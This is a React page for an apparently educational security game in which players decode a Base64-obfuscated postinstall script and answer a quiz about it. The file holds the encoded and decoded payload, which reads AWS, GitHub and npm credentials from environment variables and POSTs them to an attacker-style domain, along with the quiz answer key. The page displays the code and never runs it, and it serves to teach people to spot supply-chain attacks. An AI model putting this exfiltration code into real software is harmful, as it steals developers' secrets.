"use client";

import { useRouter } from "next/navigation";
import { useState } from "react";
import {
  TerminalWindow,
  PromptLine,
  AlertBox,
  StepProgress,
} from "@/components/terminal-ui";
import { GameProvider, useGame } from "@/lib/game-context";
import { saveScore } from "@/lib/scores";
import { cn } from "@/lib/utils";

// The encoded payload (safe educational content)
const ENCODED_PAYLOAD =
  "Y29uc3QgZW52ID0gcHJvY2Vzcy5lbnY7CmNvbnN0IHBheWxvYWQgPSBCdWZmZXIuZnJvbShKU09OLnN0cmluZ2lmeSh7CiAgYXdzX2tleTogZW52LkFXU19BQ0NFU1NfS0VZX0lELAogIGF3c19zZWNyZXQ6IGVudi5BV1NfU0VDUkVUX0FDQ0VTU19LRVksCiAgZ2l0aHViX3Rva2VuOiBlbnYuR0lUSFVCX1RPS0VOLAogIG5wbV90b2tlbjogZW52Lk5QTV9UT0tFTiwKICBob21lOiBlbnYuSE9NRSwKICB1c2VyOiBlbnYuVVNFUgp9KSkudG9TdHJpbmcoJ2Jhc2U2NCcpOwoKZmV0Y2goJ2h0dHBzOi8vY29sbGVjdC5qcmljaGFyZHNvbi1kZXYyMDI0Lnh5ei92MS9pbmdlc3QnLCB7CiAgbWV0aG9kOiAnUE9TVCcsCiAgYm9keTogcGF5bG9hZAp9KTs=";

const DECODED_PAYLOAD = `const env = process.env;
const payload = Buffer.from(JSON.stringify({
  aws_key: env.AWS_ACCESS_KEY_ID,
  aws_secret: env.AWS_SECRET_ACCESS_KEY,
  github_token: env.GITHUB_TOKEN,
  npm_token: env.NPM_TOKEN,
  home: env.HOME,
  user: env.USER
})).toString('base64');

fetch('https://collect.jrichardson-dev2024.xyz/v1/ingest', {
  method: 'POST',
  body: payload
});`;

const QUIZ_QUESTIONS = [
  {
    id: "q1",
    question: "What does the decoded script collect?",
    options: [
      "Your IP address",
      "AWS keys, GitHub token, npm token, and user info",
      "Your browsing history",
      "Nothing — it's harmless setup code",
    ],
    correct: 1,
    explanation: "It reads AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN, and system user info.",
  },
  {
    id: "q2",
    question: "Where does the payload get sent?",
    options: [
      "localhost:3000 for local dev",
      "The official npm registry",
      "An attacker-controlled server: collect.jrichardson-dev2024.xyz",
      "Your company's internal API",
    ],
    correct: 2,
    explanation: "The POST goes to a domain controlled by the attacker — not any legitimate service.",
  },
  {
    id: "q3",
    question: "Why was the payload Base64-encoded?",
    options: [
      "Base64 is a security feature that protects the data",
      "To obfuscate the malicious code and evade simple string-search detection",
      "It's standard npm package format",
      "To compress the data for faster transfer",
    ],
    correct: 1,
    explanation: "Base64 makes the code unreadable at a glance, bypassing naive scanners that look for obvious strings like 'AWS_KEY'.",
  },
];

function Base64Content() {
  const router = useRouter();
  const { foundFlag, addStepScore } = useGame();
  const [decoded, setDecoded] = useState(false);
  const [answers, setAnswers] = useState<Record<string, number>>({});
  const [submitted, setSubmitted] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [inputError, setInputError] = useState("");

  const handleDecode = () => {
    setDecoded(true);
    foundFlag("base64-exfil");
  };

  const handleManualDecode = () => {
    try {
      const result = atob(inputValue.trim());
      if (result.includes("fetch") || result.includes("process.env")) {
        setDecoded(true);
        foundFlag("base64-exfil");
        setInputError("");
      } else {
        setInputError("Decoded successfully, but try the actual payload above.");
      }
    } catch {
      setInputError("Invalid Base64 string. Try copying the payload above.");
    }
  };

  const handleAnswer = (qId: string, idx: number) => {
    if (submitted) return;
    setAnswers((prev) => ({ ...prev, [qId]: idx }));
  };

  const handleSubmit = () => {
    setSubmitted(true);
    let correct = 0;
    QUIZ_QUESTIONS.forEach((q) => {
      if (answers[q.id] === q.correct) correct++;
    });
    const score = correct * 33 + (decoded ? 1 : 0);
    const capped = Math.min(100, score);
    addStepScore("base64", capped);
    saveScore("base64", capped);
  };

  const allAnswered = QUIZ_QUESTIONS.every((q) => answers[q.id] !== undefined);

  return (
    <main className="min-h-screen px-4 py-8 max-w-3xl mx-auto space-y-6">
      <div className="space-y-2">
        <div className="text-xs text-terminal-gray">
          <span className="text-terminal-green">▶</span> Step 5 of 6
        </div>
        <StepProgress current="base64" />
      </div>

      <div className="text-center space-y-1">
        <h2 className="text-terminal-amber text-xl font-bold">
          🔓 Base64 Payload Challenge
        </h2>
        <p className="text-terminal-gray text-sm">
          You intercepted the postinstall script. Decode it to reveal what it does.
        </p>
      </div>

      {/* Encoded payload */}
      <TerminalWindow title="src/setup.js — intercepted" variant="danger">
        <div className="space-y-4">
          <div className="text-xs text-terminal-gray-light mb-2">
            This is the obfuscated content found inside setup.js:
          </div>
          <div className="font-mono text-xs text-terminal-amber break-all leading-relaxed bg-black/30 p-3 rounded border border-terminal-border">
            {ENCODED_PAYLOAD}
          </div>

          <div className="space-y-2">
            <div className="text-xs text-terminal-gray-light">
              Try decoding manually (paste the string above), or click the button:
            </div>
            <div className="flex gap-2">
              <input
                type="text"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                placeholder="Paste Base64 string here..."
                className="flex-1 bg-black/40 border border-terminal-border text-terminal-green-dim
                           font-mono text-xs px-3 py-2 rounded focus:outline-none focus:border-terminal-green
                           placeholder:text-terminal-gray"
              />
              <button
                onClick={handleManualDecode}
                className="px-4 py-2 border border-terminal-green-dim text-terminal-green-dim
                           hover:border-terminal-green hover:text-terminal-green
                           font-mono text-xs rounded transition-all"
              >
                DECODE
              </button>
            </div>
            {inputError && (
              <div className="text-terminal-red text-xs">{inputError}</div>
            )}
          </div>

          {!decoded && (
            <button
              onClick={handleDecode}
              className="w-full py-2 border border-terminal-amber text-terminal-amber font-mono
                         hover:bg-terminal-amber/10 transition-all duration-200
                         text-xs tracking-widest uppercase rounded"
            >
              Auto-Decode with Built-in Decoder
            </button>
          )}
        </div>
      </TerminalWindow>

      {/* Decoded payload */}
      {decoded && (
        <TerminalWindow title="decoded-payload.js" variant="danger">
          <div className="space-y-3">
            <div className="flex items-center gap-2 text-terminal-red text-sm font-bold">
              <span>⛔</span>
              <span>Malicious payload revealed:</span>
            </div>
            <div className="font-mono text-xs leading-relaxed bg-black/30 p-3 rounded border border-terminal-red/30 overflow-x-auto">
              {DECODED_PAYLOAD.split("\n").map((line, i) => {
                const isEnvLine = line.includes("env.");
                const isFetchLine = line.includes("fetch(") || line.includes("ingest");
                return (
                  <div
                    key={i}
                    className={cn(
                      isEnvLine && "text-terminal-amber",
                      isFetchLine && "text-terminal-red font-bold",
                      !isEnvLine && !isFetchLine && "text-terminal-green-dim"
                    )}
                  >
                    {line || " "}
                  </div>
                );
              })}
            </div>
            <div className="flex gap-4 text-xs">
              <div className="flex items-center gap-1">
                <div className="w-3 h-3 bg-terminal-amber rounded-sm" />
                <span className="text-terminal-gray-light">Credential access</span>
              </div>
              <div className="flex items-center gap-1">
                <div className="w-3 h-3 bg-terminal-red rounded-sm" />
                <span className="text-terminal-gray-light">Data exfiltration</span>
              </div>
            </div>
          </div>
        </TerminalWindow>
      )}

      {/* Quiz */}
      {decoded && (
        <TerminalWindow title="comprehension-check.sh" variant="default">
          <div className="space-y-6">
            <div className="text-terminal-green text-sm font-bold">
              Answer these questions about the decoded payload:
            </div>
            {QUIZ_QUESTIONS.map((q) => (
              <div key={q.id} className="space-y-3">
                <div className="text-terminal-green-dim text-sm">
                  <span className="text-terminal-gray mr-2">&gt;</span>
                  {q.question}
                </div>
                <div className="space-y-2">
                  {q.options.map((opt, idx) => {
                    const selected = answers[q.id] === idx;
                    const isCorrect = idx === q.correct;
                    const showResult = submitted;
                    return (
                      <button
                        key={idx}
                        onClick={() => handleAnswer(q.id, idx)}
                        disabled={submitted}
                        className={cn(
                          "w-full text-left px-3 py-2 rounded border font-mono text-xs transition-all",
                          !submitted && !selected && "border-terminal-border text-terminal-gray hover:border-terminal-green/50 hover:text-terminal-green-dim",
                          !submitted && selected && "border-terminal-green text-terminal-green bg-terminal-green-muted/50",
                          showResult && isCorrect && "border-terminal-green bg-terminal-green/10 text-terminal-green",
                          showResult && selected && !isCorrect && "border-terminal-red bg-terminal-red/10 text-terminal-red",
                          showResult && !selected && !isCorrect && "border-terminal-border text-terminal-gray opacity-50"
                        )}
                      >
                        <span className="mr-2 text-terminal-gray">[{String.fromCharCode(65 + idx)}]</span>
                        {opt}
                        {showResult && isCorrect && " ✓"}
                        {showResult && selected && !isCorrect && " ✗"}
                      </button>
                    );
                  })}
                </div>
                {submitted && (
                  <div className="text-terminal-gray text-xs px-3 italic">
                    {q.explanation}
                  </div>
                )}
              </div>
            ))}

            {!submitted && (
              <button
                onClick={handleSubmit}
                disabled={!allAnswered}
                className={cn(
                  "w-full py-2 font-mono text-sm tracking-widest uppercase rounded border transition-all",
                  allAnswered
                    ? "border-terminal-green text-terminal-green hover:bg-terminal-green hover:text-terminal-bg"
                    : "border-terminal-gray text-terminal-gray cursor-not-allowed opacity-50"
                )}
              >
                {allAnswered ? "Submit Answers" : "Answer all questions to continue"}
              </button>
            )}
          </div>
        </TerminalWindow>
      )}

      {submitted && (
        <button
          onClick={() => router.push("/final-score")}
          className="w-full py-3 border border-terminal-green text-terminal-green font-mono
                     hover:bg-terminal-green hover:text-terminal-bg transition-all duration-200
                     text-sm tracking-widest uppercase rounded"
        >
          View Final Score →
        </button>
      )}
    </main>
  );
}

export default function Base64Page() {
  return (
    <GameProvider>
      <Base64Content />
    </GameProvider>
  );
}
